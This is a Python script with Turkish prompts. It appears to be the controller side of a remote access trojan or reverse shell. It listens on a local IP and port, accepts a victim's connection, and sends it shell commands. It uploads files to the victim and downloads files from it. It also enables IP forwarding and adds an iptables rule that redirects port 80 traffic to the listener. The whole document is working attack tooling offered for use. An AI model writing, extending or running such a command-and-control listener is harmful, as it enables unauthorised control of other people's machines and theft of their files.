import socket
import base64
import simplejson
import os
from termcolor import colored, cprint
import sys
import pyautogui
import colorama
from colorama import Fore, Back, Style

colorama.init()

class SocketListener:
	def __init__(self,ip,port):
		my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		my_listener.bind((ip,port))
		my_listener.listen(0)
		print(Fore.RED)
		print("Dinleme başladı...")
		(self.my_connection,my_address) = my_listener.accept()
		print(Fore.YELLOW)
		print(" bağlantı kuruldu >> ip " + str(my_address) + "\n")
		print(Fore.GREEN)
		print("""

			Merhaba,\n\t[*] Port ve Ip forwarding etkin.\n\n\n\tNot: Dinleyici kodlarını görebilmek için 'help' veya 'yardım' kodlarını kullanınız.

			\n""")


	def json_send(self,data):
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))

	def json_recv(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue

	def command_execution(self,command_input):
		self.json_send(command_input)
		
		if command_input[0] == "exit" or command_input[0] == "çıkış":
			self.my_connection.close()
			exit()
		
		return self.json_recv()

	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Download OK"

	def get_file_content(self,path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())

	def clear(self):
		os.system("clear")
		return " "


	def start_listener(self):
		while True:
			print(Fore.RED)
			command_input = input("Komut gir: ")
			command_input = command_input.split(" ")
			try:
				print(Fore.GREEN)	
				if command_input[0] == "upload" or command_input[0] == "yükle":
					my_file_content = self.get_file_content(command_input[1])
					command_input.append(my_file_content)

				command_output = self.command_execution(command_input)

				if command_input[0] == "download" or command_input[0] == "indir" and "[+] Böyle bir komut yok. Lütfen 'help' veya 'yardım' komutunu kullanın\n" not in command_input:
					command_output = self.save_file(command_input[1],command_output)
				elif command_input[0] == "clear":
					command_output = self.clear()
			except Exception:
				print(Fore.RED)
				command_output = "\n[+] Böyle bir komut yok. Lütfen 'help' veya 'yardım' komutunu kullanın\n"
			print(command_output)





try:
	a = pyautogui.size()
	width = a[0]
	height = a[1]
	os.system("mode con cols="+str(width)+"lines="+str(height))

	os.system("clear")
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

	my_socket_listener = SocketListener("192.168.1.63",8080)
	my_socket_listener.start_listener()

except KeyboardInterrupt:
	print(Fore.GREEN)
	print("\nÇıkış yapıldı\nHoşçakalın :)")
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	sys.exit()